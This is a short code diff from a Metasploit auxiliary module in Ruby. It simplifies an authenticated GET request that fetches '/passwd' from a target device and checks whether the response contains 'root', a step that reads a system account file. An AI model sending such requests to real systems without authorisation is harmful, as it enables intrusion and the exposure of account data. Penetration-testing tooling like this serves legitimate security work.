@@ -192,9 +192,7 @@ class MetasploitModule < Msf::Auxiliary
           }
         )
 
-        file_location = '/'
-        file_name = 'passwd'
-        res = send_request_cgi({ 'method' => 'GET', 'uri' => "/#{file_location}/#{file_name}", 'cookie' => cookie2, 'headers' => { 'Accept' => '*/*', 'Accept-Language' => 'en-US,en;q=0.5', 'Accept-Encoding' => 'gzip, deflate', 'X-Requested-With' => 'XMLHttpRequest', 'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8', 'Connection' => 'close' } }, 25)
+        res = send_request_cgi({ 'method' => 'GET', 'uri' => '/passwd', 'cookie' => cookie2, 'headers' => { 'Accept' => '*/*', 'Accept-Language' => 'en-US,en;q=0.5', 'Accept-Encoding' => 'gzip, deflate', 'X-Requested-With' => 'XMLHttpRequest', 'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8', 'Connection' => 'close' } }, 25)
 
         if res && res.code == 200 && res.body =~ /root/
           vprint_status('++++++++++++++++++++++++++++++++++++++')
